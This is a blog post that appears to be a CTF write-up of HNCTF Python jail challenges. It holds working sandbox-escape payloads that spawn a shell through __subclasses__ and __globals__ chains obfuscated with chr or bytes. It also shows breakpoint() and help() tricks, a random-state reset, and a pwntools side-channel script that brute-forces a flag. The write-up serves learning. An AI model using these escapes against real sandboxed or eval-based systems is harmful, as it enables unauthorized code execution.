<!DOCTYPE html><html lang="en"><head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.0.0">
<link rel="preconnect" href="https://cdnjs.cloudflare.com" crossorigin="">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha256-XOqroi11tY4EFQMR9ZYwZWKj5ZXiftSx36RRuC3anlA=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"demoyao100.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.20.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false,"trigger":"auto"}}</script><script src="/js/config.js"></script>

    <meta name="description" content="# preface # Thanks to 空白 crazyman, who brough us so much excellent ctf exercises. (Though I didn’t work out many of them that is.) Now the HNCTF has ended, I found some write up  about the python jail">
<meta property="og:type" content="article">
<meta property="og:title" content="pythonJail">
<meta property="og:url" content="https://demoyao100.github.io/pythonJail/index.html">
<meta property="og:site_name" content="Moyao の小屋">
<meta property="og:description" content="# preface # Thanks to 空白 crazyman, who brough us so much excellent ctf exercises. (Though I didn’t work out many of them that is.) Now the HNCTF has ended, I found some write up  about the python jail">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://demoyao100.github.io/pythonJail/level1.png">
<meta property="og:image" content="https://demoyao100.github.io/pythonJail/level1wp.png">
<meta property="og:image" content="https://demoyao100.github.io/pythonJail/level2.png">
<meta property="og:image" content="https://demoyao100.github.io/pythonJail/level3.png">
<meta property="og:image" content="https://demoyao100.github.io/pythonJail/level3wp.png">
<meta property="og:image" content="https://demoyao100.github.io/pythonJail/input(jail).png">
<meta property="og:image" content="https://demoyao100.github.io/pythonJail/input(jail)wp.png">
<meta property="og:image" content="https://demoyao100.github.io/pythonJail/level2.5.png">
<meta property="og:image" content="https://demoyao100.github.io/pythonJail/lake.png">
<meta property="og:image" content="https://demoyao100.github.io/pythonJail/l%40ke.png">
<meta property="og:image" content="https://demoyao100.github.io/pythonJail/level5.png">
<meta property="og:image" content="https://demoyao100.github.io/pythonJail/level4.png">
<meta property="og:image" content="https://demoyao100.github.io/pythonJail/laKelaKe.png">
<meta property="og:image" content="https://demoyao100.github.io/pythonJail/level5.1_1.png">
<meta property="og:image" content="https://demoyao100.github.io/pythonJail/level5.1_2.png">
<meta property="og:image" content="https://demoyao100.github.io/pythonJail/lak3.png">
<meta property="og:image" content="https://demoyao100.github.io/pythonJail/sideChannel.png">
<meta property="og:image" content="https://demoyao100.github.io/pythonJail/level4_1.png">
<meta property="og:image" content="https://demoyao100.github.io/pythonJail/level4wp1.png">
<meta property="og:image" content="https://demoyao100.github.io/pythonJail/level4wp2.png">
<meta property="og:image" content="https://demoyao100.github.io/pythonJail/level4wp_3.png">
<meta property="og:image" content="https://demoyao100.github.io/pythonJail/level4.0.5.png">
<meta property="og:image" content="https://demoyao100.github.io/pythonJail/level4.1wp1.png">
<meta property="og:image" content="https://demoyao100.github.io/pythonJail/level4.2wp.png">
<meta property="og:image" content="https://demoyao100.github.io/pythonJail/level4.3wp.png">
<meta property="og:image" content="https://demoyao100.github.io/pythonJail/level6wp1.png">
<meta property="og:image" content="https://demoyao100.github.io/pythonJail/level6wp2.png">
<meta property="og:image" content="https://demoyao100.github.io/pythonJail/level6wp3.png">
<meta property="og:image" content="https://demoyao100.github.io/pythonJail/level6.1wp.png">
<meta property="og:image" content="https://demoyao100.github.io/pythonJail/safeeval_1.png">
<meta property="og:image" content="https://demoyao100.github.io/pythonJail/safeeval_2.png">
<meta property="og:image" content="https://demoyao100.github.io/pythonJail/level7wp1.png">
<meta property="og:image" content="https://demoyao100.github.io/pythonJail/level7wp2.png">
<meta property="article:published_time" content="2022-11-01T07:48:11.000Z">
<meta property="article:modified_time" content="2024-05-05T01:56:19.758Z">
<meta property="article:author" content="Moyao">
<meta property="article:tag" content="jail">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://demoyao100.github.io/pythonJail/level1.png">


<link rel="canonical" href="https://demoyao100.github.io/pythonJail/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://demoyao100.github.io/pythonJail/","path":"pythonJail/","title":"pythonJail"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>pythonJail | Moyao の小屋</title>
  
    <script async="" src="https://www.googletagmanager.com/gtag/js?id=G-KKC145B2WB"></script>
  <script class="next-config" data-name="google_analytics" type="application/json">{"tracking_id":"G-KKC145B2WB","only_pageview":false,"measure_protocol_api_secret":null}</script>
  <script src="/js/third-party/analytics/google-analytics.js"></script>








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope="" itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope="" itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">Moyao の小屋</p>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">Hi,I'm Moyaoxue</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="Search" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-tags"><a href="/tags.html" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-categories"><a href="/categories.html" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li><li class="menu-item menu-item-about"><a href="/about.html" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>Sitemap</a></li><li class="menu-item menu-item-rss"><a href="/atom.xml" rel="section"><i class="fa fa-rss fa-fw"></i>RSS</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
      <div class="search-header">
        <span class="search-icon">
          <i class="fa fa-search"></i>
        </span>
        <div class="search-input-container">
          <input autocomplete="off" autocapitalize="off" maxlength="80" placeholder="Searching..." spellcheck="false" type="search" class="search-input">
        </div>
        <span class="popup-btn-close" role="button">
          <i class="fa fa-times-circle"></i>
        </span>
      </div>
      <div class="search-result-container">
        <div class="search-result-icon">
          <i class="fa fa-spinner fa-pulse fa-5x"></i>
        </div>
      </div>
    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <div class="sidebar-panel-container">
        
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#preface"><span class="nav-number">1.</span> <span class="nav-text"> preface</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#thanks-to-%E7%A9%BA%E7%99%BDcrazyman-who-brough-us-so-much-excellent-ctf-exercises-though-i-didnt-work-out-many-of-them-that-is-now-the-hnctf-has-ended-i-found-some-write-up-about-the-python-jail-problemspythonjail"><span class="nav-number">1.0.1.</span> <span class="nav-text"> Thanks to 空白 crazyman, who brough us so much excellent ctf exercises. (Though I didn’t work out many of them that is.) Now the HNCTF has ended, I found some write up  about the python jail problemspythonJail.</span></a></li></ol></li></ol><li class="nav-item nav-level-3"><a class="nav-link" href="#level-1"><span class="nav-number"></span> <span class="nav-text"> LEVEL 1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level-2"><span class="nav-number"></span> <span class="nav-text"> LEVEL 2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level-3"><span class="nav-number"></span> <span class="nav-text"> LEVEL 3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#python2-input-jail"><span class="nav-number"></span> <span class="nav-text"> PYTHON2 INPUT JAIL</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level-25"><span class="nav-number"></span> <span class="nav-text"> LEVEL 2.5</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#lake"><span class="nav-number"></span> <span class="nav-text"> LAKE</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#strange-christencrazyman-seems-to-name-it-lake-from-leak"><span class="nav-number">0.0.1.</span> <span class="nav-text"> Strange christen.(Crazyman seems to name it ‘lake’ from ‘leak’?)</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#lke"><span class="nav-number"></span> <span class="nav-text"> L@KE</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#another-strange-christen"><span class="nav-number">0.0.1.</span> <span class="nav-text"> Another strange christen…</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level-5"><span class="nav-number"></span> <span class="nav-text"> LEVEL 5</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level-4"><span class="nav-number"></span> <span class="nav-text"> LEVEL 4</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#why-is-it-4-after-5-i-dont-know"><span class="nav-number">0.0.1.</span> <span class="nav-text"> (Why is it 4 after 5 I don’t know…)</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#lake-2"><span class="nav-number"></span> <span class="nav-text"> LAkE</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#payload"><span class="nav-number">0.1.</span> <span class="nav-text"> payload:</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level-51"><span class="nav-number"></span> <span class="nav-text"> LEVEL 5.1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#lak3"><span class="nav-number"></span> <span class="nav-text"> LAK3</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#a-good-blog-can-refer"><span class="nav-number">0.1.</span> <span class="nav-text"> a good blog can refer</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#type-chnnel"><span class="nav-number"></span> <span class="nav-text"> tyPe Ch@nnEl</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level-4-2"><span class="nav-number"></span> <span class="nav-text"> LEVEL 4</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#level-4-again"><span class="nav-number">0.0.1.</span> <span class="nav-text"> level 4 again</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link"><span class="nav-number">0.1.</span> <span class="nav-text"> </span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#payload-2"><span class="nav-number">0.2.</span> <span class="nav-text"> payload:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level-405"><span class="nav-number"></span> <span class="nav-text"> LEVEL 4.0.5</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level-41"><span class="nav-number"></span> <span class="nav-text"> LEVEL 4.1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level-42"><span class="nav-number"></span> <span class="nav-text"> LEVEL 4.2</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#or-rather-use-join"><span class="nav-number">0.1.</span> <span class="nav-text"> Or rather use  join :</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level-43"><span class="nav-number"></span> <span class="nav-text"> LEVEL 4.3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level-6"><span class="nav-number"></span> <span class="nav-text"> LEVEL 6</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#repetition"><span class="nav-number">1.</span> <span class="nav-text"> repetition:</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#link-that-may-help-you"><span class="nav-number">1.1.</span> <span class="nav-text"> link that may help you</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level-61"><span class="nav-number"></span> <span class="nav-text"> LEVEL 6.1</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#payload-3"><span class="nav-number">0.1.</span> <span class="nav-text"> payload:</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#or"><span class="nav-number">0.2.</span> <span class="nav-text"> or</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#safeeval"><span class="nav-number"></span> <span class="nav-text"> SAFEEVAL</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level7"><span class="nav-number"></span> <span class="nav-text"> LEVEL7</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#come-back-later-to-try-to-figure-it-out"><span class="nav-number">0.0.1.</span> <span class="nav-text"> Come back later to try to figure it out…</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#blog"><span class="nav-number">0.1.</span> <span class="nav-text"> blog</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ok-so-thats-the-end-of-the-hnctf-there-are-some-thing-that-may-help-you-get-further-about-pyjail"><span class="nav-number"></span> <span class="nav-text"> Ok, so that’s the end of the hnctf. There are some thing that may help you get further about pyjail:</span></a></li></div>
        </div>
        

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="Moyao" src="/images/avatar.webp">
  <p class="site-author-name" itemprop="name">Moyao</p>
  <div class="site-description" itemprop="description">Write down something interesting I met<br>
Feel free to mail me if you have something wanted to talk about, plz
mail: &lt;moyaoxue@outlook.com&gt;
</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">85</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags.html">
        <span class="site-state-item-count">19</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <a href="/moyaoxue@outlook.com" title="E-Mail → moyaoxue@outlook.com" rel="noopener me"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>

        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope="" itemtype="http://schema.org/Article" class="post-content" lang="en">
    <link itemprop="mainEntityOfPage" href="https://demoyao100.github.io/pythonJail/">

    <span hidden="" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Moyao">
    </span>

    <span hidden="" itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Moyao の小屋">
      <meta itemprop="description" content="Write down something interesting I met<br />
Feel free to mail me if you have something wanted to talk about, plz
mail: <moyaoxue@outlook.com>
">
    </span>

    <span hidden="" itemprop="post" itemscope="" itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="pythonJail | Moyao の小屋">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          pythonJail
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2022-11-01 15:48:11" itemprop="dateCreated datePublished" datetime="2022-11-01T15:48:11+08:00">2022-11-01</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><h4 id="preface"><a class="markdownIt-Anchor" href="#preface">#</a> preface</h4>
<h6 id="thanks-to-空白crazyman-who-brough-us-so-much-excellent-ctf-exercises-though-i-didnt-work-out-many-of-them-that-is-now-the-hnctf-has-ended-i-found-some-write-up-about-the-python-jail-problemspythonjail"><a class="markdownIt-Anchor" href="#thanks-to-空白crazyman-who-brough-us-so-much-excellent-ctf-exercises-though-i-didnt-work-out-many-of-them-that-is-now-the-hnctf-has-ended-i-found-some-write-up-about-the-python-jail-problemspythonjail">#</a> Thanks to 空白 crazyman, who brough us so much excellent ctf exercises. (Though I didn’t work out many of them that is.) Now the HNCTF has ended, I found some write up  about the python jail problems<a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/sandbox/python/python-sandbox-escape/">pythonJail</a>.</h6>
<span id="more"></span>
<h3 id="level-1"><a class="markdownIt-Anchor" href="#level-1">#</a> LEVEL 1</h3>
<p><img src="/pythonJail/level1.webp" alt="level1"></p>
<p>From the function filter, we sees that the symbol [" ’ ` i b] is banned. Which means (Show subclasses with tuple)  <code> ().\__class\__.\__base\__.\__subclasses\__()</code></p>
<p>is not allowed. What’s more, symbol ’ and " is banned, so it come to us that we may can use  <code>chr</code>  to splicing a string that we wanted.</p>
<p>Two possible payload:</p>
<blockquote>
<p>getattr(getattr(getattr(getattr(()._<em>class_</em>,c),chr(95)+chr(95)+chr(115)+chr(117)+chr(98)+chr(99)+chr(108)+chr(97)+chr(115)+chr(115)+chr(101)+chr(115)+chr(95)+chr(95))()[-4],chr(95)+chr(95)+chr(105)+chr(110)+chr(105)+chr(116)+chr(95)+chr(95)),chr(95)+chr(95)+chr(103)+chr(108)+chr(111)+chr(98)+chr(97)+chr(108)+chr(115)+chr(95)+chr(95))[chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)](chr(115)+chr(104))<br>
(().__class__.__base__.__subclasses__()[-4].__init__.__globals__<a href="'sh'">‘system’</a>)</p>
</blockquote>
<blockquote>
<p>open(chr(102)+chr(108)+chr(97)+chr(103)).read()<br>
from <a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/578986988">thisBlog</a></p>
</blockquote>
<p><img src="/pythonJail/level1wp.webp" alt="level1pos"></p>
<h3 id="level-2"><a class="markdownIt-Anchor" href="#level-2">#</a> LEVEL 2</h3>
<p><img src="/pythonJail/level2.webp" alt="level1"></p>
<p>The length of the payload is limited to 13.</p>
<p>The answer according to 空白 is the function <c style="color: #FF0000">“breakpoint()”</c>, which I didn’t figure out yet. However, there is another way. Use  <code>eval(input())</code>  so that the program receive once again for your input! Seems a little bit like  <code>/?cmd=system($_POST[1]);$1=ls</code>  to escape the filter in php right?</p>
<h3 id="level-3"><a class="markdownIt-Anchor" href="#level-3">#</a> LEVEL 3</h3>
<p><img src="/pythonJail/level3.webp" alt="level3"></p>
<p>This time, the maximum length of our payload is down to 7.</p>
<p>I didn’t quite understand yet, but function  <code>help()</code>  can help you passby the 7 words limit. Here is when I tried others’ payload, quite amazing and when I am available I shall come back to study it.</p>
<blockquote></blockquote>
<p><img src="/pythonJail/level3wp.webp" alt="level3"></p>
<h3 id="python2-input-jail"><a class="markdownIt-Anchor" href="#python2-input-jail">#</a> PYTHON2 INPUT JAIL</h3>
<p><img src="/pythonJail/input(jail).webp" alt="input(jail)"></p>
<p>python2, another thing I am not familiar with…</p>
<p>Looking up others’ write up…</p>
<p><img src="/pythonJail/input(jail)wp.webp" alt="input(jail)"></p>
<h3 id="level-25"><a class="markdownIt-Anchor" href="#level-25">#</a> LEVEL 2.5</h3>
<p><img src="/pythonJail/level2.5.webp" alt="level2.5"></p>
<p>We can use  <code>breakpoint()</code>  to go into pdb, and rce is possible.</p>
<h3 id="lake"><a class="markdownIt-Anchor" href="#lake">#</a> LAKE</h3>
<p><img src="/pythonJail/lake.webp" alt="lake"></p>
<h6 id="strange-christencrazyman-seems-to-name-it-lake-from-leak"><a class="markdownIt-Anchor" href="#strange-christencrazyman-seems-to-name-it-lake-from-leak">#</a> Strange christen.(Crazyman seems to name it ‘lake’ from ‘leak’?)</h6>
<p>Use  <code>globals()</code>  to leak the key. And then get shell.</p>
<h3 id="lke"><a class="markdownIt-Anchor" href="#lke">#</a> L@KE</h3>
<p><img src="/pythonJail/l%40ke.webp" alt="l@ke"></p>
<h6 id="another-strange-christen"><a class="markdownIt-Anchor" href="#another-strange-christen">#</a> Another strange christen…</h6>
<p>The maxinum length of payload is now 6, so only  <code>help()</code>  is possible.</p>
<p>But unlike cases above, this time module ‘os’ is destory or whatever. Now we comes to the base reason why we use ‘os’ above.  <code>help()</code>  can actually get you into any module in the python file, which includes  <code>__main__</code> ! And surely, the key can be found inside.</p>
<br>
##### OK, now we've go through the first four level( designed by crazyman, that is). From level 5, there provides no source code.
<br>
<h3 id="level-5"><a class="markdownIt-Anchor" href="#level-5">#</a> LEVEL 5</h3>
<p><img src="/pythonJail/level5.webp" alt="level5"></p>
<p>Just rce can give you the flag.(unexpected) Later we will see how it shall really be work out.</p>
<h3 id="level-4"><a class="markdownIt-Anchor" href="#level-4">#</a> LEVEL 4</h3>
<h6 id="why-is-it-4-after-5-i-dont-know"><a class="markdownIt-Anchor" href="#why-is-it-4-after-5-i-dont-know">#</a> (Why is it 4 after 5 I don’t know…)</h6>
<p>4 bytes rce, seems impossible, so lets just guass it use  <code>os.system(input_data)</code>  to get your input and bingo.</p>
<p><img src="/pythonJail/level4.webp" alt="level4"></p>
<h3 id="lake-2"><a class="markdownIt-Anchor" href="#lake-2">#</a> LAkE</h3>
<p><img src="/pythonJail/laKelaKe.webp" alt="laKe"></p>
<p>This time it imports  <code>sys</code>  module with <a target="_blank" rel="noopener" href="https://peps.python.org/pep-0578/">audit hook</a>, and direct RCE function like  <code>pty.spawn、os.system、os.exec、os.posix_spawn、os.spawn、subprocess.Popen</code>  is not available. Whats more,  <code>compile、eval、exec、open</code>  is unfetchable. However, there use  <code>random.setstate()</code>  to generate its random number, which is base on Mersenne <a target="_blank" rel="noopener" href="https://zh.wikipedia.org/zh-tw/%E6%A2%85%E6%A3%AE%E6%97%8B%E8%BD%AC%E7%AE%97%E6%B3%95">Twister</a>, and is crackable. In general, if we got the state of the random number generator, we can generate the same number. That leads two problems: There is only one ‘eval’ in the server code, but we need to execute more. How to restore the state BEFORE the random number is generated?</p>
<p>First, we need to know a thing named Assignment Expresions in python, or rather, walrus operator. Then, we package those formula in a list. They will be calculate from left to right. As for function, we can replace it with  <code>lambda</code> . Some case can be view below:</p>
<pre><code>https://ctftime.org/writeup/21982

https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes#operators-and-short-tricks
</code></pre>
<p>Second, if we  <code>import random</code>  and print  <code>random.getstate</code>  at the beginning, we got a tuple back. which may look like: <code>(3, (..., 624), None)</code> . The first value ‘3’ and the last value ‘None’ is fixed. Only 624 numbers in the middle is changed. So if we assign the conter zero, we get the random number.</p>
<h5 id="payload"><a class="markdownIt-Anchor" href="#payload">#</a> payload:</h5>
<pre><code>[random:=\_\_import__('random'), state:=random.getstate(), pre_state:=list(state[1])[:624], random.setstate((3,tuple(pre_state+[0]),None)), random.randint(1, 9999999999999)][-1]
</code></pre>
<h3 id="level-51"><a class="markdownIt-Anchor" href="#level-51">#</a> LEVEL 5.1</h3>
<p>Dued to the unexpected solves in level5, crazyman gives another problem, stating level5.1.</p>
<p><code>nc</code>  and  <code>dir()</code> (as it tells you to), found  <code>my_flag</code> , try  <code>list(getattr(my_flag,'flag))</code> , got a  <code>AttributeError: 'flag_level5' object has no attribute 'flag'</code> . So payload is  <code>list(getattr(my_flag,'flag_level5'))</code></p>
<p>Another way to solve this problem(though quite similar, the latter gets its shell)</p>
<p><img src="/pythonJail/level5.1_1.webp" alt="level5.1_1"><br>
<img src="/pythonJail/level5.1_2.webp" alt="level5.1_2"></p>
<h3 id="lak3"><a class="markdownIt-Anchor" href="#lak3">#</a> LAK3</h3>
<p><img src="/pythonJail/lak3.webp" alt="lak3"></p>
<p>Same as before, we can use the excate same payload. Though the official payload provides by crazyman is  <code>__import__('sys')._getframe(1).f_locals['right_guesser_question_answer']</code></p>
<h5 id="a-good-blog-can-refer"><a class="markdownIt-Anchor" href="#a-good-blog-can-refer">#</a> <a target="_blank" rel="noopener" href="https://ctftime.org/writeup/21982">a good blog can refer</a></h5>
<h3 id="type-chnnel"><a class="markdownIt-Anchor" href="#type-chnnel">#</a> tyPe Ch@nnEl</h3>
<p><img src="/pythonJail/sideChannel.webp" alt="sideChannel"></p>
<p>I haven’t quite understand yet. So I will put the payload beforehand:</p>
<p>One possible:</p>
<pre><code>from pwn import *
from tqdm import trange

class Gao:
    def __init__(self):
        self.known = ''

def init(self):
    # self.conn = process(['python3', './server_type.py'])
    self.conn = remote('1.14.71.254', 28563)

def gao(self):
    payload = '((1)if(type(flag.split())(flag.encode()).pop({pos})^{val})else(True))'
    i = len(self.known)
    while True:
        for j in trange(32, 128):
            cur_payload = payload.format(pos=i, val=j)
            self.init()
            self.conn.sendlineafter('Payload:', cur_payload)
            s = self.conn.recvline()
            self.conn.close()
            if (b'Try' in s):
                return
            elif (b'bool' in s):
                self.known += chr(j)
                print(self.known)
                print(self.known)
                print(self.known)
                break
        else:
            raise Exception('GG simida')            
        i += 1
if __name__ == '__main__':
    g = Gao()
    g.gao()
</code></pre>
<p>↑ Can took some time(when I tried)</p>
<p>Officail:</p>
<pre><code>for i in range(len(flag), len(flag)+100): # flag length
for guess in chars: # all possible chars
    print("guess: ", bytes(flag), chr(guess))
    payload = f"type(type(flag).mro())(type(type(flag).mro())(flag).pop({i}).encode()).remove({guess})"
</code></pre>
<h3 id="level-4-2"><a class="markdownIt-Anchor" href="#level-4-2">#</a> LEVEL 4</h3>
<h6 id="level-4-again"><a class="markdownIt-Anchor" href="#level-4-again">#</a> level 4 again</h6>
<p><img src="/pythonJail/level4_1.webp" alt="level4_1"></p>
<p>Quite similar as before, just use  <code>bytes().decode()</code>  to pass the black list.</p>
<p><img src="/pythonJail/level4wp1.webp" alt="level4_1wp1"><br>
<img src="/pythonJail/level4wp2.webp" alt="level4_1wp2"></p>
<p>payload:</p>
<pre><code>().__class__.__base__.__subclasses__()
</code></pre>
<h5 id=""><a class="markdownIt-Anchor" href="#">#</a> </h5>
<p>​    ().<strong>class</strong>.<strong>base</strong>.<strong>subclasses</strong>()[-4].<strong>init</strong>.<strong>globals</strong>[bytes([115, 121, 115, 116, 101, 109]).decode()](bytes([115, 104]).decode())</p>
<p>There is another solution to this problem: I am not sure I fully understand it, so I put a <a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/579057932">link</a> here beforehand.</p>
<h5 id="payload-2"><a class="markdownIt-Anchor" href="#payload-2">#</a> payload:</h5>
<pre><code>().__class__.__base__.__subclasses__()[-4].__init__.__globals__[().__doc__[19]+().__doc__[86]+().__doc__[19]+().__doc__[4]+().__doc__[17]+().__doc__[10]](().__doc__[19]+().__doc__[56])
</code></pre>
<p><img src="/pythonJail/level4wp_3.webp" alt="level4wp3"></p>
<h3 id="level-405"><a class="markdownIt-Anchor" href="#level-405">#</a> LEVEL 4.0.5</h3>
<p>Same payload as last one.</p>
<p><img src="/pythonJail/level4.0.5.webp" alt="level4.0.5"></p>
<h3 id="level-41"><a class="markdownIt-Anchor" href="#level-41">#</a> LEVEL 4.1</h3>
<p>Quite same as before.</p>
<p><img src="/pythonJail/level4.1wp1.webp" alt="level4.1"></p>
<p>Ps, the  <code>bytes</code>  is now banned, but still you can use  <code>show subclassed with tuples</code>  to replace, like this:</p>
<pre><code>().__class__.__base__.__subclasses__()[-4].__init__.__globals__[().__class__.__base__.__subclasses__()[6]([115, 121, 115, 116, 101, 109]).decode()](().__class__.__base__.__subclasses__()[6]([115, 104]).decode())
</code></pre>
<h3 id="level-42"><a class="markdownIt-Anchor" href="#level-42">#</a> LEVEL 4.2</h3>
<p>Quite same as before…</p>
<p><img src="/pythonJail/level4.2wp.webp" alt="level4.2"></p>
